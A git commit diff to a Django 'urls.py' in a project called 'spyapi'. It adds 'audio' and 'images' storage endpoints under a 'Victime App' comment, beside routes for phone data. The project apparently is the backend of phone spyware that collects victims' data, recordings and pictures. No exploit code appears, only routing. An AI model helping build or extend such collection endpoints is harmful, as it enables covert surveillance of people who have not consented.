b1e6e26f8ec642ca39af27f25e17edda986fa705
Roushan Alam <aroushan9@gmail.com>
2022-03-18 22:52:13 +0530

    Update urls.py

--- spyapi/urls.py
+++ spyapi/urls.py
@@ -1,6 +1,9 @@
 from django.contrib import admin
 from django.urls import path
-from . import views
+from api import views
+from django.conf import settings
+from django.conf.urls.static import static
+
 
 urlpatterns = [
     # Admin App
@@ -12,8 +15,11 @@ urlpatterns = [
     path('get_All_device', views.Get_All_device.as_view()),
 
     # Victime App
-
     path('phonedata_created', views.Phone_data_created.as_view()),
     path('phoneUpdate/<int:pk>', views.Phone_data_Update.as_view()),
+    path('audio', views.Audio_stor.as_view()),
+    path('images', views.Image_stor.as_view()),
 
 ]
+urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
+urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
